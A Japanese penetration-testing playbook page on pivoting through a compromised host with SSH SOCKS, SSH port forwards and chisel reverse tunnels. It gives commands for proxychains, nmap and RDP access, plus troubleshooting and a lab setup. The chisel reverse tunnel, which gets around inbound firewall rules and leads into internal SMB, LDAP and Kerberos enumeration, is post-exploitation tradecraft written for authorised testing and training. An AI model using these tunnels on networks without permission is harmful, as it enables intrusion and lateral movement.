## ガイドライン対応（ASVS / WSTG / PTES / MITRE ATT&CK：毎回記載）
- ASVS
  - 位置づけ：トンネル/プロキシは「境界（ネットワーク分離・認証境界）」を跨ぐ実装そのもの。ASVSの個別要件というより、**“運用・構成上の境界がどう成立しているか”** を検証する前提（管理系到達、内部API到達、監視/ログ、認証強制）。
  - 接続：管理インタフェースの露出（不要公開）、ネットワーク分離の実効性、監査証跡（誰がどの経路で到達したか）に繋げる。
- WSTG
  - 位置づけ：Webテスト対象に“到達できない”時、WSTGのテスト項目を実施できない。Pivotで観測点を移し、**内部管理画面・内部API・メタデータ等のテスト対象**を現実的にする。
  - 接続：認証/認可/入力の検証は「到達経路が確立している」ことが前提。Pivotはその前提条件を作る。
- PTES
  - 位置づけ：Post-Exploitation / Lateral Movement / Maintaining Access（ただし本ファイルは“維持”より“安全な到達性確立”に焦点）。
  - ゴール：スキャン/列挙が可能な安定経路を作り、**次工程（SMB/LDAP/Kerberos/WinRM/RDP等）に渡す**。
- MITRE ATT&CK
  - T1090 Proxy（Pivotの中心）
    - T1090.001 Internal Proxy / T1090.002 External Proxy / T1090.003 Multi-hop Proxy
  - T1572 Protocol Tunneling（HTTP(S)等でトンネル）
  - Discovery/Remote Services（T1021）へ接続：Pivotで到達できた先でSMB/WinRM/RDP/SSH等が成立する。

---

# 07_pivot_tunneling（ssh_socks_chisel）

## 目的（この技術で到達する状態）
- “外側（自端末）から見える世界”ではなく、**侵害済みホスト/踏み台/社内端末などの「内側」から観測できる世界**を手元に持ち帰る。
- 具体的には以下を満たす：
  1) あるネットワーク（A）にいる自分が、別ネットワーク（B）への通信を**B側の観測点**として発生させられる  
  2) その通信の形（SOCKS/port forward/HTTP tunnel）を選び、**到達性（許可/遮断/監視）を分解**して説明できる  
  3) トンネル経由で「列挙・スキャン・Webアクセス・管理プロトコル接続」を、**再現性ある手順**で実施できる  
  4) 証跡（コマンド・設定・ポート・接続元/先）が残り、後から「何をしたか」を説明できる  
  5) トンネルが壊れた時に、原因（DNS/経路/認証/ポート競合/MTU/keepalive/EDR遮断）を切り分けできる

---

## 前提（対象・範囲・安全設計）
### 前提となる“立ち位置”を明示する
- 自端末（Operator）＝あなたのKali等
- Pivot端末（踏み台/侵害ホスト/社内端末）＝Bへ到達できる端末
- 内部ターゲット（Target）＝B側で列挙・攻撃の対象

### 実施条件（必ず揃える）
- 権限：許可された診断/演習であること（契約スコープ）
- OS/環境：
  - Pivot端末にSSHサーバがある/入れられる、またはchiselを実行できる
  - Egress（外向き通信）とIngress（外からの接続許可）の制約がある前提で設計する
- 証跡：
  - いつ/どこから/どこへ/どのトンネル（ポート）で繋いだかを記録（報告・再現・説明のため）

### 安全設計（壊さないための設計）
- Pivotは“通信の集約点”になるため、負荷が集中する
  - スキャンは **帯域・同時接続** を抑える（masscan等は特に）
- 競合を避ける
  - ローカルポート/リモートポートの衝突、既存プロキシ（企業端末のPAC等）との衝突に注意
- “外へ漏れる”を防ぐ（重要）
  - DNSリーク（プロキシ経由にしたつもりが自端末のDNSで解決）
  - 直接接続（proxychainsの適用漏れ）
  - ルーティング設定ミス（意図しないネットへ出る）

---

## 概念整理（最初にこれを揃える：意味→判断→次の一手）
### Pivot/Tunnelingの型（3種類だけ覚える）
1) SOCKSプロキシ（動的転送）
- 使い所：多種多様なTCP通信を“まとめて”流したい（ブラウザ、curl、nmapの一部、各種クライアント）
- 代表：SSH dynamic (-D)、chisel socks
- 注意：UDPは原則弱い（アプリ依存）

2) ポートフォワード（静的転送）
- 使い所：特定の1サービス（例：RDP/WinRM/SMB/DB）だけ確実に通したい
- 代表：SSH local (-L) / remote (-R)、chisel port forward
- 注意：対象が増えると設定地獄になるが、確実性は高い

3) ルーティング型（L3っぽく見せる）
- 使い所：内部ネット全体に“自端末から直接いるように”アクセスしたい
- 本ファイルでは中心にしない（ssh_socks_chiselに集中）  
  ※実務ではsshuttle等が候補になるが、別ファイルで扱うのが適切

---

## 観測ポイント（どこで詰まっているか：境界の分解）
Pivotは「到達できない」を“どの境界で止まっているか”に分解する技術。

### 1) 物理/経路境界
- VPN内か、社内LANか、隔離セグメントか
- Pivot端末が “内部ターゲット” へルーティングできるか（GW/ACL）

### 2) FW/プロキシ境界（Egress/Ingress）
- Pivot端末から外へ出られるか（例：443のみ許可、DNSだけ許可、全部禁止）
- 自端末からPivot端末へ入れるか（SSHが開いているか、逆接続が必要か）

### 3) 認証境界（接続そのもの）
- SSH鍵/パスワード、MFA、Jump host
- chisel実行が許されるか（EDR/アプリ制御）

### 4) 名前解決境界（DNSリークの温床）
- “内部FQDN”を解決したい時、解決はどこで起きるべきか
  - 自端末で解決してはいけない（外部DNSに漏れる/解決不能）
  - Pivot側/内部DNSで解決させる必要がある

---

## 全体フロー（実施方法：最高に具体）
> 以降は「典型の3シナリオ」で、最小構成→安定化→運用の順に実装する。

- シナリオA：SSHで入れる（Inbound可）→SSH SOCKSでPivot
- シナリオB：SSHで入れる（Inbound可）→SSH Local Port Forwardで特定サービスを通す
- シナリオC：Inboundが厳しい（外から入れない）→chisel Reverseで外へ出てPivot

---

## シナリオA：SSH Dynamic SOCKS（-D）で“内側のTCP”をまとめて運ぶ
### 目的
- 自端末にSOCKS5を立て、ブラウザ/curl/一部ツールを「内部から出た通信」に見せかける。

### 0) 事前確認（Pivot上でやる：内部へ届くか）
- Pivot上から内部ターゲットへ最低限の到達確認（pingは当てにしない）
~~~~
# Pivot端末で実行（例）
ip a
ip r
# 代表ポートに対して到達（例：SMB/LDAP/RDP/HTTP）
nc -vz 10.10.20.10 445
nc -vz 10.10.20.11 389
nc -vz 10.10.20.12 3389
~~~~
- 判断
  - ここで届かないなら、Pivotを作っても届かない（経路/ACL問題）
  - 届くなら、以降は“自端末→Pivot”の経路を作るだけ

### 1) 自端末からSOCKS5を起動（SSH -D）
- まずは最小（127.0.0.1にSOCKSを開ける）
~~~~
# 自端末（Kali等）で実行
# 1080にSOCKS5を作る。-N（シェル不要）, -f（バックグラウンド）, -C（圧縮は状況次第）
ssh -D 127.0.0.1:1080 -N <user>@<pivot_ip>

# 成功確認（自端末）
ss -lntp | grep 1080
~~~~
- 判断
  - ローカルに1080がLISTENしていればSOCKSは立っている（ただし内部へ通る保証はまだ）

### 2) proxychains を設定（“適用漏れ”を防ぐ）
- proxychainsは「このコマンドはプロキシ経由」を強制できるため、実務でのミスを減らす
- 設定例（/etc/proxychains4.conf）
  - socks5 127.0.0.1 1080
  - DNSリーク対策：proxychainsのDNS設定（環境によるが“プロキシDNS”を意識する）
~~~~
# 設定ファイルを編集（例）
sudo sed -n '1,200p' /etc/proxychains4.conf
# 末尾付近に以下のイメージで追加/確認
# socks5  127.0.0.1 1080
~~~~

### 3) 内部HTTPを観測（curlで最短確認）
~~~~
# まずはIP直指定で内部HTTP
proxychains -q curl -I http://10.10.20.50/

# HTTPSの場合（証明書は観測優先で -k）
proxychains -q curl -kI https://10.10.20.50/

# もし内部FQDNが必要なら、Hostを合わせる（DNSより先に“HTTP到達”を確定）
proxychains -q curl -kI https://10.10.20.50/ -H 'Host: internal-app.local'
~~~~
- 判断
  - レスポンスが返れば「自端末→SOCKS→Pivot→内部HTTP」が成立
  - タイムアウトなら、次の切り分けへ（後述）

### 4) 内部ポート確認（nmapは“使い方を誤ると”詰む）
- 注意：nmapはSOCKS越しに全てがうまく動くわけではない（スキャン種別/権限/RAWソケット）
- 原則：SOCKS越しは **TCP connect（-sT）** で割り切る
~~~~
# SOCKS越しの到達確認としてのnmap（-sT）
proxychains -q nmap -sT -Pn -n -p 80,443,445,389,3389 10.10.20.0/24 --open -oN nmap_over_socks.txt
~~~~
- 判断
  - -sS（SYN）をSOCKS越しで期待しない（RAWパケットは出せないため）
  - ここで得た“到達できるポート”を次工程（SMB/LDAP等）に渡す

### 5) ブラウザ運用（“ここが一番事故る”）
- ブラウザのプロキシ設定でSOCKS5 127.0.0.1:1080
- 重要：DNSの扱い
  - “SOCKS越しにDNS解決”できていないと内部FQDNが引けず詰む
  - まずはIP直アクセスで到達性を確定→次にDNS解決へ進む（順序が重要）

---

## シナリオB：SSH Local Port Forward（-L）で“特定サービスを確実に通す”
### 目的
- SOCKSが不安定/相性が悪い/ツールがSOCKS非対応の時に、**必要なポートだけを確実に通す**。

### 代表例1：内部RDP（3389）を自端末の13389に転送
~~~~
# 自端末で実行：localhost:13389 → pivot → 10.10.20.12:3389
ssh -L 127.0.0.1:13389:10.10.20.12:3389 -N <user>@<pivot_ip>

# 成功確認
ss -lntp | grep 13389

# 以降はRDPクライアントを localhost:13389 に向ける
~~~~

### 代表例2：内部Web（443）を自端末の18443に転送（Hostヘッダが必要な場合に有効）
~~~~
ssh -L 127.0.0.1:18443:10.10.20.50:443 -N <user>@<pivot_ip>

# curlで確認（SNI/Hostが絡むなら --resolve を使う）
curl -vkI https://127.0.0.1:18443/ -H 'Host: internal-app.local'
~~~~

### 判断（-Lを選ぶ基準）
- “この1つを確実に通したい” → -L
- “いろいろ通したい” → -D（SOCKS）
- “外からPivotに入れない” → chisel reverse

---

## シナリオC：chisel Reverse（外へ出られる）で“入れない環境”を突破して観測点を移す
> ここは実務で最重要。Inbound（自端末→Pivot）が塞がれていても、Pivotから外へ出られる（Egress可）なら成立することがある。  
> ただし許可範囲・運用合意・監視影響を必ず確認すること。

### 前提となる境界の整理（成立条件を先に言語化）
- Pivot端末 → あなたの受け口（server）へ **外向き接続** できる（典型：443/tcpのみ）
- あなた側で待受できる（クラウドVM/社内検証環境など、許可された受け口）
- chiselが動作可能（実行制御・EDRで止まる可能性）

### 1) “受け口”にchisel server（reverse有効）を起動
- 受け口は「あなたが制御できる場所」。ここにサーバを立てる。
~~~~
# あなた側（server側）で実行
# 例：0.0.0.0:8443で待受、reverseを許可
./chisel server --reverse -p 8443
~~~~

### 2) Pivot端末からserverへ“外向き”に接続（client）
- Pivotが外へ出られるポートに合わせる（例：443/8443）
~~~~
# Pivot端末で実行（serverへ外向き接続）
./chisel client <server_ip>:8443 R:socks
~~~~
- この時点での意味
  - server側にSOCKS（動的プロキシ）が生える（実装・設定によりポートが決まる）
  - 以降、あなたはserver側のSOCKSに繋いで内部へ行ける

### 3) 自端末から“server側SOCKS”を使う（proxychains等）
- あなたの端末がserverに到達できる前提で、SOCKSを設定する
~~~~
# 例：proxychains設定に server:1080 のようなSOCKSを登録（chiselの出力に従う）
# socks5 <server_ip> <socks_port>
~~~~
- 以降はシナリオAと同様に、proxychainsで内部へアクセスする

### 4) “静的ポートフォワード”もreverseで作れる（R:）
- SOCKSではなく「このサービスだけ」通したい場合
~~~~
# 例：server側の13389 → Pivot経由 → 内部RDP(10.10.20.12:3389)
./chisel client <server_ip>:8443 R:13389:10.10.20.12:3389
~~~~
- これにより、あなたはserverの13389へRDP接続し、内部へ到達できる

---

## 失敗時の切り分け（“何が悪いか”を最短で特定）
> Pivotは失敗要因が多い。闇雲に設定を増やすと泥沼になる。  
> いつでも「どの区間が死んでいるか」を分解して確認する。

### 1) 区間分解（必ずこれで考える）
- 区間①：自端末 → Pivot（SSHが張れるか、認証が通るか）
- 区間②：Pivot → 内部ターゲット（Pivot上で直接届くか）
- 区間③：自端末 → ローカルプロキシ（SOCKSがLISTENしているか）
- 区間④：プロキシ経由のアプリ通信（proxychains適用漏れ/ツール非対応）

### 2) よくある詰まりと対処
- SSHは張れるが、proxychains経由通信がタイムアウト
  - 対処：Pivot上で同じ宛先へ `nc -vz`（区間②の確認）
  - 対処：ツールを `curl` で最小確認（HTTPなら最短）
- 内部FQDNが引けない
  - 対処：まずIP直アクセスで到達性を確定（DNS問題と分離）
  - 対処：DNS解決を“どこで行うべきか”を決める（Pivot側/内部DNS）
- nmapが不自然な結果になる
  - 対処：SOCKS越しは `-sT` 前提。SYNスキャンを期待しない
- トンネルがすぐ切れる
  - 対処：SSH keepalive設定、回線品質、EDRの遮断（ログ確認）
- ポート競合
  - 対処：ローカルのLISTEN確認（ss/netstat）、別ポートへ変更

---

## 攻撃者視点での利用（意思決定：優先度・攻め筋・次の仮説）
### 1) Pivotは“情報の価値”を一段上げる
- 外側から見えない資産（DC、管理ネット、内部API）に到達できるようになると、
  - SMB/LDAP/Kerberosの列挙が可能になり、横展開が現実になる
  - Webも内部管理画面が対象に入る（認証/認可/ログの差分が出る）

### 2) “到達できたサービス”から次ファイルへ直結する
- 445/SMBが見える → `09_smb_enum_共有・権限・匿名（null_session）.md`
- 389/636 LDAPが見える → `11_ldap_enum_ディレクトリ境界（匿名_bind）.md`
- 88 Kerberosが見える → `12_kerberos_asrep_kerberoast_成立条件.md`
- 3389 RDPが見える → `19_rdp_設定と認証（NLA）.md`
- 5985/5986 WinRMが見える → `18_winrm_psremoting_到達性と権限.md`

---

## 次に試すこと（運用として“回せる形”に落とす）
### 1) 成果物（最低限この形で残す）
- Pivot設計メモ（例）
  - 観測点：自端末（IP）→Pivot（IP/ホスト名/OS）→内部セグメント（CIDR）
  - 手段：SSH -D / SSH -L / chisel reverse（どれを使ったか）
  - ローカルポート：1080/13389/18443 等
  - 到達確認ログ：curl/nc/nmap(-sT)の結果
  - リスク：DNSリーク対策、適用漏れ対策、負荷対策

### 2) “安定化”のチェック（毎回やる）
- トンネルは立っているか（LISTEN確認）
- proxychains適用漏れはないか（コマンド冒頭にproxychainsを付ける運用）
- 内部へ届くか（Pivot上でのnc確認）
- どのサービスを次に列挙するか（SMB/LDAP/Kerberos/WinRM/RDPの順序）

---

## 04_labs（検証環境案：観測→切り分けを体で覚える）
### ラボ構成（最小）
- VM1：攻撃端末（Kali）
- VM2：Pivot（Linux、2NIC：外側NW + 内側NW）
- VM3：内部ターゲット（Windows or Linux）
- 変数
  - ルール1：外側からPivotへSSHは許可
  - ルール2：外側から内部へは遮断
  - ルール3：Pivotから内部へは許可
- 検証
  - SSH -Dで内部HTTPへアクセスできること
  - SSH -Lで内部RDP/特定ポートへ到達できること
  - FWルールを変えて“どこで止まるか”を区間分解で説明できること

---

## ガイドライン対応（ASVS / WSTG / PTES / MITRE ATT&CK：毎回）
- ASVS：境界の実効性（管理面露出/ネットワーク分離/証跡）を検証するための前提として、到達経路（プロキシ/トンネル）を“観測可能な形”で確立する。
- WSTG：内部管理画面・内部APIなど、Webテスト対象へ到達できるようにして初めてWSTG項目を適用できる。Pivotは“テスト可能性”を作る工程。
- PTES：Post-Exploitationでの到達性確立（Pivot）→内部列挙→横展開の入り口を作る。成功/失敗を境界（区間）で説明できることが品質。
- MITRE ATT&CK：T1090 Proxy / T1572 Protocol Tunneling。Pivotで観測点を移し、DiscoveryとRemote Servicesを成立させる。

---

## 深掘りリンク（作成済み / 予定：最大8件）
- `05_scanning_到達性把握（nmap_masscan）.md`
- `06_service_fingerprint（banner_tls_alpn）.md`
- `08_firewall_waf_検知と回避の境界（観測中心）.md`
- `09_smb_enum_共有・権限・匿名（null_session）.md`
- `11_ldap_enum_ディレクトリ境界（匿名_bind）.md`
- `12_kerberos_asrep_kerberoast_成立条件.md`
- `18_winrm_psremoting_到達性と権限.md`
- `19_rdp_設定と認証（NLA）.md`
